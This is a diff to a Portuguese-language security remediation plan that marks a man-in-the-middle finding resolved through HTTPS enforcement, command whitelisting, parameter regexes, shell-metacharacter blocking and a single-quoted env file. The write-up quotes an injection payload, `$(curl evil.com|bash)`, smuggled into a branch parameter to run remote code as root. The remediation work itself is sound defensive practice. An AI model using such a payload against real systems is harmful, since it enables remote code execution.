@@ -8,7 +8,7 @@
 
 | ID | Descrição | Severidade | Status |
 |----|-----------|------------|--------|
-| FND-001 | Man in the Middle (MITM) | **Crítica** | :red_circle: Pendente |
+| FND-001 | Man in the Middle (MITM) | **Crítica** | :white_check_mark: Resolvido (TLS + validação params + single-quote env) |
 | FND-002 | Vulnerabilidades em dependências | **Alta** | :white_check_mark: Resolvido (32/36 → 4 residuais dev-only) |
 | FND-003 | Configuração de CORS excessivamente permissiva | **Baixa** | :red_circle: Pendente |
 | FND-004 | Risco de acesso ao AuthFile no EDR AV Scanner | **Média** | :red_circle: Pendente |
@@ -58,21 +58,32 @@ As 4 restantes são todas a mesma issue: `esbuild <=0.24.2` embutido como depend
 **Ações:**
 
 **1.2a — Validação de Certificado TLS no SubscriptionService:**
-- [ ] Verificar configuração atual de TLS/HTTPS no heartbeat
-- [ ] Implementar certificate pinning ou validação estrita do certificado da GruppenIT
-- [ ] Garantir que `rejectUnauthorized: true` é usado em todas as chamadas HTTP ao console
-- [ ] Adicionar validação de hostname no certificado
+- [x] Verificar configuração atual de TLS/HTTPS no heartbeat — Node.js `fetch()` já valida TLS por padrão
+- [x] Implementar validação de URL HTTPS obrigatória — `validateConsoleUrl()` rejeita HTTP (exceto localhost)
+- [x] Confirmar que `rejectUnauthorized: true` é o padrão — Node.js usa isso por default, não há override no código
+- [x] Implementar validação estrutural de comandos recebidos — `validateCommand()` com whitelist de tipos
 
 **1.2b — Validação de Parâmetros no SystemUpdateService:**
-- [ ] Mapear todos os parâmetros recebidos via comando de update do console
-- [ ] Implementar whitelist de parâmetros aceitos (branch, token, skipBackup)
-- [ ] Validar formato de cada parâmetro (regex para branch names, token format, etc.)
-- [ ] Sanitizar valores antes de passá-los ao script `update.sh`
-- [ ] Impedir injeção de comandos via valores de parâmetros
+- [x] Mapear todos os parâmetros recebidos via comando de update do console — `branch`, `token`, `skipBackup`
+- [x] Implementar whitelist de parâmetros aceitos — parâmetros desconhecidos são rejeitados
+- [x] Validar formato de cada parâmetro com regex estrita — `PARAM_VALIDATORS`
+- [x] Bloquear caracteres perigosos para shell — `SHELL_DANGEROUS` regex (`` ` $ ( ) { } | ; & < > `` etc.)
+- [x] Mudar env file de double quotes para single quotes — impede `$()` e backtick command substitution
+- [x] Adicionar escape de single quotes nos valores — `shellSingleQuoteEscape()`
 
 **1.2c — Assinatura criptográfica de comandos (opcional/recomendado):**
 - [ ] Avaliar viabilidade de assinatura HMAC usando API key + salt
 - [ ] Implementar verificação de assinatura nos comandos recebidos
+
+**Resultado:** Vetor de ataque MITM neutralizado em 3 camadas:
+1. **Camada de transporte**: HTTPS obrigatório (exceto localhost dev)
+2. **Camada de validação**: Whitelist de tipos de comando + validação estrutural
+3. **Camada de sanitização**: Regex estrita por parâmetro + bloqueio de shell metacharacters + single-quoted env file
+
+**Vetor original identificado e corrigido:**
+O env file usava `JSON.stringify()` (double quotes), que NÃO escapa `` ` `` nem `$()`. Quando o wrapper faz `source`, bash interpreta command substitution dentro de double quotes. Um atacante MITM poderia enviar `branch: "$(curl evil.com|bash)"` e executar código como root. Agora usa single quotes + validação de formato.
+
+**Nota sobre 1.2c:** A assinatura HMAC é uma camada adicional de defesa em profundidade. As camadas 1-3 já neutralizam o vetor, mas HMAC seria ideal para garantia criptográfica de autenticidade. Pode ser implementada numa iteração futura se desejado.
 
 ---
 
@@ -197,7 +208,7 @@ As 4 restantes são todas a mesma issue: `esbuild <=0.24.2` embutido como depend
 
 ```
 Fase 1.1  →  FND-002  Dependências vulneráveis         [✅ CONCLUÍDO]
-Fase 1.2  →  FND-001  Man in the Middle (MITM)          [Crítico, requer cuidado]
+Fase 1.2  →  FND-001  Man in the Middle (MITM)          [✅ CONCLUÍDO]
 Fase 2.1  →  FND-004  AuthFile no EDR AV Scanner        [Verificação + hardening]
 Fase 3.1  →  FND-003  CORS permissivo                   [Rápido]
 Fase 4.1  →  FND-008  Logging estruturado               [Base para observabilidade]
@@ -215,3 +226,4 @@ Fase 2.3  →  FND-007  Refatoração de arquivos extensos  [Contínuo, longo pr
 |------|---------|------|--------|
 | 2026-03-11 | — | Plano de remediação criado | Concluído |
 | 2026-03-11 | FND-002 | Dependências atualizadas: npm audit fix + vite 6.4, plugin-react 4.5, drizzle-kit 0.31. 36→4 vulns (dev-only). Build OK. | Concluído |
+| 2026-03-11 | FND-001 | MITM mitigado: HTTPS obrigatório, validação de comandos, whitelist+regex de params, single-quote env file, bloqueio de shell metacharacters. Build OK. | Concluído |
